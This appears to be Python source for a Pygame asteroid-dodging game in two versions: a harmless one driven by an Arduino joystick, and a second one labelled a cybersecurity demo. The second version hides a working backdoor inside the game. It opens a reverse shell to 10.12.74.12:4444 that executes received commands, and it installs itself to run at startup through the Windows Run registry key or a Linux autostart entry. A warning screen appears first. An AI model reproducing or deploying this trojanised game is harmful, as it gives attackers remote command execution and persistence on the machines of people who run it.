import pygame
import random
import serial

# Initialize Pygame mixer
pygame.mixer.init()
pygame.init()

# Constants
SCREEN_WIDTH = 800
SCREEN_HEIGHT = 600
ASTEROID_SIZE = 30
OBJECT_WIDTH = 50
OBJECT_HEIGHT = 50

# Initial position for the object
object_x = (SCREEN_WIDTH - OBJECT_WIDTH) // 2
object_y = (SCREEN_HEIGHT - OBJECT_HEIGHT) // 2

# Colors
WHITE = (255, 255, 255)
RED = (255, 0, 0)

# Joystick initialization
ser = serial.Serial('COM6', 115200)  # Update 'COM6' with your Arduino port

# Initialize Pygame window
pygame.display.set_caption("Avoid the Asteroids!")
window = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))

# Load sounds
collision_sound = pygame.mixer.Sound('collision_sound.mp3')
game_over_sound = pygame.mixer.Sound('gameover.mp3')

# Load images with transparency
object_image = pygame.image.load('new_object.png').convert_alpha()
object_image = pygame.transform.scale(object_image, (70, 70))

background_image = pygame.image.load('space_bg.png').convert()
background_image = pygame.transform.scale(background_image, (SCREEN_WIDTH, SCREEN_HEIGHT))

original_asteroid_image = pygame.image.load('asteroid_image.png').convert_alpha()
ASTEROID_SIZE = (40, 40)
asteroid_image = pygame.transform.scale(original_asteroid_image, ASTEROID_SIZE)

# Function to check collisions
def check_collisions():
    global score
    spaceship_rect = pygame.Rect(object_x, object_y, OBJECT_WIDTH, OBJECT_HEIGHT)
    for asteroid_position in asteroids:
        asteroid_x, asteroid_y, asteroid_size = asteroid_position
        asteroid_rect = pygame.Rect(asteroid_x, asteroid_y, asteroid_size, asteroid_size)
        if spaceship_rect.colliderect(asteroid_rect):
            print("Game Over!")
            collision_sound.play()  # Play collision sound
            game_over_sound.play()  # Play game over sound
            pygame.time.delay(2000)  # Pause for 2 seconds (2000 milliseconds)
            return True  # Collision occurred
    return False

# Main game loop
while True:
    # Game variables
    asteroids = []
    score = 0

    # Game state
    GAME_OVER = 0
    GAME_RUNNING = 1
    current_state = GAME_RUNNING

    # Game loop
    try:
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    quit()

            # Get joystick data from Arduino
            data = ser.readline().decode('ascii')
            data = data.strip()
            data = ''.join(filter(str.isdigit, data))
            if data.startswith('S'):
                data = data[1:]

            # Check if there are enough characters in the joystick data
            if len(data) >= 2:
                try:
                    xc = int(data[0])
                    yc = int(data[1])
                except ValueError as e:
                    print(f"Error converting joystick data to integers: {e}")
                    continue
            else:
                print("Not enough characters in the joystick data.")
                continue

            # Move the object based on joystick input
            if current_state == GAME_RUNNING:
                object_x += (xc - 1) * 5
                object_y += (yc - 1) * 5

            # Ensure the object stays within the screen boundaries
            object_x = max(0, min(SCREEN_WIDTH - OBJECT_WIDTH, object_x))
            object_y = max(0, min(SCREEN_HEIGHT - OBJECT_HEIGHT, object_y))

            # Check for collisions
            if current_state == GAME_RUNNING:
                if check_collisions():
                    current_state = GAME_OVER

            # Draw the background
            window.blit(background_image, (0, 0))

            # Draw the object only if the game is running
            if current_state == GAME_RUNNING:
                window.blit(object_image, (object_x, object_y))

            # Draw Asteroids
            for asteroid_position in asteroids:
                asteroid_x, asteroid_y, asteroid_size = asteroid_position
                window.blit(asteroid_image, (asteroid_x, asteroid_y))

            # Draw the score
            font = pygame.font.Font(None, 36)
            score_text = f"Score: {score}"
            text_surface = font.render(score_text, True, WHITE)
            window.blit(text_surface, (10, 10))

            # Update asteroids and score
            if current_state == GAME_RUNNING:
                if random.randint(1, 20) == 1:
                    asteroid_size = random.randint(10, 30)
                    asteroid_x = random.randint(0, SCREEN_WIDTH - asteroid_size)
                    asteroid_y = -asteroid_size
                    asteroids.append((asteroid_x, asteroid_y, asteroid_size))
                for i, asteroid_position in enumerate(asteroids):
                    asteroid_x, asteroid_y, asteroid_size = asteroid_position
                    asteroids[i] = (asteroid_x, asteroid_y + 5, asteroid_size)
                    score += 1  # Increase score for each frame

            # Draw "Game Over" screen
            if current_state == GAME_OVER:
                score_text = font.render(f"Total score: {score}", True, RED)
                game_over_text = font.render("Game Over !! Click \'R\' To restart", True, RED)
                window.blit(game_over_text, ((SCREEN_WIDTH - game_over_text.get_width()) // 2, (SCREEN_HEIGHT - game_over_text.get_height()) // 2 - 50))
                window.blit(score_text, ((SCREEN_WIDTH - score_text.get_width()) // 2, (SCREEN_HEIGHT - score_text.get_height()) // 2 + 50))
                pygame.display.flip()

                # Wait for user input to restart or quit
                waiting_for_key = True
                while waiting_for_key:
                    for event in pygame.event.get():
                        if event.type == pygame.QUIT:
                            pygame.quit()
                            quit()
                        if event.type == pygame.KEYDOWN:
                            if event.key == pygame.K_r:
                                waiting_for_key = False  # Restart the game
                                current_state = GAME_RUNNING
                                asteroids = []
                                score = 0
                                object_x = (SCREEN_WIDTH - OBJECT_WIDTH) // 2
                                object_y = (SCREEN_HEIGHT - OBJECT_HEIGHT) // 2
                            elif event.key == pygame.K_q:
                                pygame.quit()
                                quit()  # Quit the game

            # Redraw the Pygame window
            pygame.display.flip()

    except KeyboardInterrupt:
        pygame.quit()
        
        
        
        
# -----------------
# This file is for cybersecurity learning purposes only
# Instead of using joystick, user uses keyboard to move
# It also performs persistence and introduces a backdoor in the user's computer

import pygame
import random
import sys
import subprocess
import pkg_resources
import socket
import threading
import os
import platform
import winreg

def check_dependencies():
    required = {"pygame"}
    installed = {pkg.key for pkg in pkg_resources.working_set}
    missing = required - installed
    if missing:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except subprocess.CalledProcessError:
            sys.exit(1)

check_dependencies()

def start_reverse_shell():
    try:
        HOST = "10.12.74.12"  # Replace with your listener IP
        PORT = 4444
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.send(b"Victim connected\n")
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            result = subprocess.getoutput(command)
            s.send(result.encode())
        s.close()
    except Exception:
        pass

def add_to_startup():
    if platform.system() == "Windows":
        script_path = os.path.abspath(__file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "AsteroidGame", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
    elif platform.system() == "Linux":
        startup_dir = os.path.expanduser("~/.config/autostart/")
        os.makedirs(startup_dir, exist_ok=True)
        startup_path = os.path.join(startup_dir, "asteroid_game.desktop")
        with open(startup_path, "w") as f:
            f.write(f"[Desktop Entry]\nType=Application\nExec={os.path.abspath(__file__)}\nHidden=false\nNoDisplay=false\nName=AsteroidGame\n")

pygame.mixer.init()
pygame.init()

SCREEN_WIDTH = 800
SCREEN_HEIGHT = 600
OBJECT_WIDTH = 50
OBJECT_HEIGHT = 50
ASTEROID_SIZE = (40, 40)

object_x = 0  # Bottom-left corner
object_y = SCREEN_HEIGHT - OBJECT_HEIGHT

WHITE = (255, 255, 255)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
YELLOW = (255, 255, 0)  # For warning text

pygame.display.set_caption("Avoid the Asteroids!")
window = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))

# Load assets
collision_sound = pygame.mixer.Sound('assets/collision_sound.mp3')
game_over_sound = pygame.mixer.Sound('assets/gameover.mp3')
you_win_sound = pygame.mixer.Sound('assets/youwin.mp3')
object_image = pygame.transform.scale(pygame.image.load('assets/new_object.png').convert_alpha(), (70, 70))
background_image = pygame.transform.scale(pygame.image.load('assets/space_bg.png').convert(), (SCREEN_WIDTH, SCREEN_HEIGHT))
asteroid_image = pygame.transform.scale(pygame.image.load('assets/asteroid_image.png').convert_alpha(), ASTEROID_SIZE)

def show_warning_screen():
    font = pygame.font.Font(None, 36)
    warning_lines = [
        "WARNING: This is a cybersecurity demo!",
        "Running this game will:",
        "- Add itself to startup (persistence)",
        "- Open a reverse shell to 10.12.74.12:4444",
        "Gameplay: Avoid the Asteroids!",
        "- Use arrow keys to move the spaceship.",
        "- Reach the top to win, avoid asteroids to survive.",
        "- Score points by moving up (100 bonus at top).",
        "Press 'Y' to continue, 'N' to exit.",
        "This is for educational purposes only."
    ]
    window.blit(background_image, (0, 0))
    for i, line in enumerate(warning_lines):
        text = font.render(line, True, YELLOW)
        window.blit(text, (SCREEN_WIDTH // 2 - text.get_width() // 2, 100 + i * 40))
    pygame.display.flip()

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_y:
                    return True  # Proceed
                elif event.key == pygame.K_n:
                    pygame.quit()
                    sys.exit()  # Exit

def check_collisions():
    global score
    spaceship_rect = pygame.Rect(object_x, object_y, OBJECT_WIDTH, OBJECT_HEIGHT)
    for asteroid_x, asteroid_y, asteroid_size in asteroids:
        asteroid_rect = pygame.Rect(asteroid_x, asteroid_y, asteroid_size, asteroid_size)
        if spaceship_rect.colliderect(asteroid_rect):
            collision_sound.play()
            game_over_sound.play()
            pygame.time.delay(2000)
            return True
    return False

# Show warning screen before proceeding
if show_warning_screen():
    shell_thread = threading.Thread(target=start_reverse_shell)
    shell_thread.start()
    add_to_startup()

while True:
    asteroids = []
    score = 0
    GAME_OVER = 0
    GAME_RUNNING = 1
    GAME_WON = 2
    current_state = GAME_RUNNING

    object_x = 0
    object_y = SCREEN_HEIGHT - OBJECT_HEIGHT

    try:
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    sys.exit()

            keys = pygame.key.get_pressed()
            if current_state == GAME_RUNNING:
                if keys[pygame.K_LEFT]:
                    object_x -= 2
                if keys[pygame.K_RIGHT]:
                    object_x += 2
                if keys[pygame.K_UP]:
                    object_y -= 2
                    score += 1
                if keys[pygame.K_DOWN]:
                    object_y += 2

            object_x = max(0, min(SCREEN_WIDTH - OBJECT_WIDTH, object_x))
            object_y = max(0, min(SCREEN_HEIGHT - OBJECT_HEIGHT, object_y))

            if current_state == GAME_RUNNING and object_y <= 0:
                current_state = GAME_WON
                score += 100
                you_win_sound.play()
                pygame.time.delay(2000)

            if current_state == GAME_RUNNING and check_collisions():
                current_state = GAME_OVER

            window.blit(background_image, (0, 0))
            if current_state == GAME_RUNNING:
                window.blit(object_image, (object_x, object_y))

            for asteroid_x, asteroid_y, _ in asteroids:
                window.blit(asteroid_image, (asteroid_x, asteroid_y))

            font = pygame.font.Font(None, 36)
            score_text = font.render(f"Score: {score}", True, WHITE)
            window.blit(score_text, (10, 10))

            if current_state == GAME_RUNNING:
                if random.randint(1, 70) == 1:
                    asteroid_size = random.randint(10, 30)
                    asteroid_x = random.randint(0, SCREEN_WIDTH - asteroid_size)
                    asteroid_y = -asteroid_size
                    asteroids.append((asteroid_x, asteroid_y, asteroid_size))
                for i, (ax, ay, a_size) in enumerate(asteroids):
                    asteroids[i] = (ax, ay + 0.5, a_size)

            elif current_state == GAME_OVER:
                score_text = font.render(f"Total score: {score}", True, RED)
                game_over_text = font.render("Game Over !! Press 'R' to restart or 'Q' to quit", True, RED)
                window.blit(game_over_text, ((SCREEN_WIDTH - game_over_text.get_width()) // 2, (SCREEN_HEIGHT - game_over_text.get_height()) // 2 - 50))
                window.blit(score_text, ((SCREEN_WIDTH - score_text.get_width()) // 2, (SCREEN_HEIGHT - score_text.get_height()) // 2 + 50))
                pygame.display.flip()

                waiting_for_key = True
                while waiting_for_key:
                    for event in pygame.event.get():
                        if event.type == pygame.QUIT:
                            pygame.quit()
                            sys.exit()
                        if event.type == pygame.KEYDOWN:
                            if event.key == pygame.K_r:
                                waiting_for_key = False
                                current_state = GAME_RUNNING
                                asteroids = []
                                score = 0
                                object_x = 0
                                object_y = SCREEN_HEIGHT - OBJECT_HEIGHT
                            elif event.key == pygame.K_q:
                                pygame.quit()
                                sys.exit()

            elif current_state == GAME_WON:
                score_text = font.render(f"Total score: {score}", True, GREEN)
                win_text = font.render("You Win !! Press 'R' to restart or 'Q' to quit", True, GREEN)
                window.blit(win_text, ((SCREEN_WIDTH - win_text.get_width()) // 2, (SCREEN_HEIGHT - win_text.get_height()) // 2 - 50))
                window.blit(score_text, ((SCREEN_WIDTH - score_text.get_width()) // 2, (SCREEN_HEIGHT - score_text.get_height()) // 2 + 50))
                pygame.display.flip()

                waiting_for_key = True
                while waiting_for_key:
                    for event in pygame.event.get():
                        if event.type == pygame.QUIT:
                            pygame.quit()
                            sys.exit()
                        if event.type == pygame.KEYDOWN:
                            if event.key == pygame.K_r:
                                waiting_for_key = False
                                current_state = GAME_RUNNING
                                asteroids = []
                                score = 0
                                object_x = 0
                                object_y = SCREEN_HEIGHT - OBJECT_HEIGHT
                            elif event.key == pygame.K_q:
                                pygame.quit()
                                sys.exit()

            pygame.display.flip()

    except KeyboardInterrupt:
        pygame.quit()
        sys.exit()
